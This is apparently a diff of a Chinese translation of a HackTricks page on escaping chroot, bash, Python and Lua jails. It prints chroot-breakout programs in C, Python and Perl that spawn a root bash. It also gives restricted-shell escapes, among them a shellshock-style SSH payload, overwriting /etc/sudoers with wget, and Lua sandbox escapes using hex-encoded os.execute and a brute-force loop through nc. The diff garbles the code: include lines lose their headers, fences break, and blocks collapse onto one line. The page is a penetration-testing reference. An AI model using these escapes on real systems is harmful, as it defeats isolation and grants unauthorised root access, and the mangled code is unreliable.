@@ -1,4 +1,4 @@
-# 逃离监狱环境
+# Escaping from Jails
 
 <details>
 
@@ -40,24 +40,14 @@
 <details>
 
 <summary>C: break_chroot.c</summary>
-```c
-#include <sys/stat.h>
-#include <stdlib.h>
-#include <unistd.h>
 
-//gcc break_chroot.c -o break_chroot
+\`\`\`c #include #include #include
 
-int main(void)
-{
-mkdir("chroot-dir", 0755);
-chroot("chroot-dir");
-for(int i = 0; i < 1000; i++) {
-chdir("..");
-}
-chroot(".");
-system("/bin/bash");
-}
-```
+//gcc break\_chroot.c -o break\_chroot
+
+int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }
+
+````
 </details>
 
 <details>
@@ -72,22 +62,12 @@ for i in range(1000):
 os.chdir("..")
 os.chroot(".")
 os.system("/bin/bash")
-```
-<details>
+````
 
-<summary>Perl</summary>
 
-</details>
-```perl
-#!/usr/bin/perl
-mkdir "chroot-dir";
-chroot "chroot-dir";
-foreach my $i (0..1000) {
-chdir ".."
-}
-chroot ".";
-system("/bin/bash");
-```
+
+\`\`\`perl #!/usr/bin/perl mkdir "chroot-dir"; chroot "chroot-dir"; foreach my $i (0..1000) { chdir ".." } chroot "."; system("/bin/bash"); \`\`\`
+
 </details>
 
 ### Root + 已保存的文件描述符
@@ -99,31 +79,20 @@ system("/bin/bash");
 <details>
 
 <summary>C: break_chroot.c</summary>
-```c
-#include <sys/stat.h>
-#include <stdlib.h>
-#include <unistd.h>
 
-//gcc break_chroot.c -o break_chroot
+\`\`\`c #include #include #include
 
-int main(void)
-{
-mkdir("tmpdir", 0755);
-dir_fd = open(".", O_RDONLY);
-if(chroot("tmpdir")){
-perror("chroot");
-}
-fchdir(dir_fd);
-close(dir_fd);
-for(x = 0; x < 1000; x++) chdir("..");
-chroot(".");
-}
-```
+//gcc break\_chroot.c -o break\_chroot
+
+int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd); for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }
+
+````
 </details>
 
 ### Root + Fork + UDS (Unix Domain Sockets)
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 FD 可以通过 Unix Domain Sockets 传递，因此：
 
 * 创建子进程 (fork)
@@ -132,39 +101,48 @@ FD 可以通过 Unix Domain Sockets 传递，因此：
 * 在父进程中创建一个 FD，指向子进程 chroot 外的文件夹
 * 通过 UDS 将该 FD 传递给子进程
 * 子进程 chdir 到该 FD，由于它位于其 chroot 外部，它将逃离监狱
-{% endhint %}
+
+</div>
 
 ### Root + Mount
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * 将根设备 (/) 挂载到 chroot 内部的目录中
 * Chroot 进入该目录
 
 这在 Linux 中是可能的
-{% endhint %}
+
+</div>
 
 ### Root + /proc
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * 将 procfs 挂载到 chroot 内部的目录中（如果尚未挂载）
 * 寻找具有不同 root/cwd 条目的 pid，例如：/proc/1/root
 * Chroot 进入该条目
-{% endhint %}
+
+</div>
 
 ### Root(?) + Fork
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * 创建 Fork（子进程）并 chroot 进入文件系统更深层的不同文件夹，并在其中 CD
 * 从父进程中，将子进程所在的文件夹移动到子进程 chroot 之前的文件夹
 * 这个子进程将发现自己在 chroot 外部
-{% endhint %}
+
+</div>
 
 ### ptrace
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * 过去用户可以从其自身的进程中调试自己的进程... 但这默认不再可能
 * 无论如何，如果可能，你可以 ptrace 进入一个进程并在其中执行 shellcode（[参见此示例](linux-capabilities.md#cap_sys_ptrace)）。
-{% endhint %}
+
+</div>
 
 ## Bash 监狱
 
@@ -177,48 +155,61 @@ echo $PATH
 env
 export
 pwd
-```
-### 修改 PATH
+````
+
+#### 修改 PATH
 
 检查是否可以修改 PATH 环境变量
+
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-### 使用 vim
+
+#### 使用 vim
+
 ```bash
 :set shell=/bin/sh
 :shell
 ```
-### 创建脚本
+
+#### 创建脚本
 
 检查是否可以创建一个内容为 _/bin/bash_ 的可执行文件
+
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
-### 通过 SSH 获取 bash
+
+#### 通过 SSH 获取 bash
 
 如果您通过 ssh 访问，可以使用这个技巧来执行一个 bash shell：
+
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-### 声明
+
+#### 声明
+
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
-### Wget
+
+#### Wget
 
 你可以覆盖例如sudoers文件
+
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-### 其他技巧
+
+#### 其他技巧
 
 以下页面包含了关于逃离受限Linux shell的技巧：
 
@@ -227,36 +218,35 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 [https://gtfobins.github.io](https://gtfobins.github.io)\
 **以下页面也可能有趣：**
 
-{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
-[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
-{% endcontent-ref %}
-
-## Python 监狱
+### Python 监狱
 
 关于逃离Python监狱的技巧，请参阅以下页面：
 
-{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
-[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
-{% endcontent-ref %}
-
-## Lua 监狱
+### Lua 监狱
 
 在此页面中，你可以找到在Lua中可以访问的全局函数：[https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
 **使用命令执行的Eval：**
+
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
+
 一些**不使用点调用库函数**的技巧：
+
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
+
 列举库的函数：
+
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
+
 请注意，每次在**不同的lua环境中执行前面的单行命令时，函数的顺序都会改变**。因此，如果您需要执行一个特定的函数，您可以通过加载不同的lua环境并调用库的第一个函数来执行暴力破解攻击：
+
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -267,24 +257,17 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
+
 **获取交互式lua shell**：如果你处于一个受限的lua shell中，你可以通过以下方式调用来获取一个新的lua shell（希望是无限制的）：
+
 ```bash
 debug.debug()
 ```
-## 参考资料
+
+### 参考资料
 
 * [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (幻灯片: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
-<details>
 
-<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击技巧！</strong></summary>
-
-支持HackTricks的其他方式：
-
-* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**
 
 </details>
